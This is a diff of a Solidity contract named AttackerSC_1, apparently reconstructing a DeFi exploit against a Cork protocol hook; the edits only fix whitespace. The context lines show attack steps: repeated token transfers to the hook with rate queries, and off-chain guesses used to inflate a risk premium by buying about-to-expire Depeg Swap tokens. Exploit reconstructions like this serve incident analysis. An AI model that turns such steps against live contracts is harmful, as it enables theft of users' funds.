@@ -50,7 +50,7 @@ contract AttackerSC_1 {
         for (uint256 i = 0; i <= 9; i++) {
             mtk.transfer(address(corkHook), i * 1e18);
             exchangeRateProvider.rate(PAIR_ID_FOR_RATE); // Step 1.4.1
-                // probably some validations/accepted threshold check is made here to break the loop
+            // probably some validations/accepted threshold check is made here to break the loop
         }
 
         // Step 1.5. lidoWstETH.transferFrom sender (exploiter EOA) to AttSC_1 the sum of 10e18
@@ -70,7 +70,7 @@ contract AttackerSC_1 {
 
         /*
          Guesses made with offchain calculations to inflate the risk premium
-         over 1,779.7 quadrillion percent by effectively buying 2.5e18 about-to-expire 
+         over 1,779.7 quadrillion percent by effectively buying 2.5e18 about-to-expire
          Depeg Swap (DS) tokens
         */
         IPSMProxy.OffchainGuess memory offchainGuess;
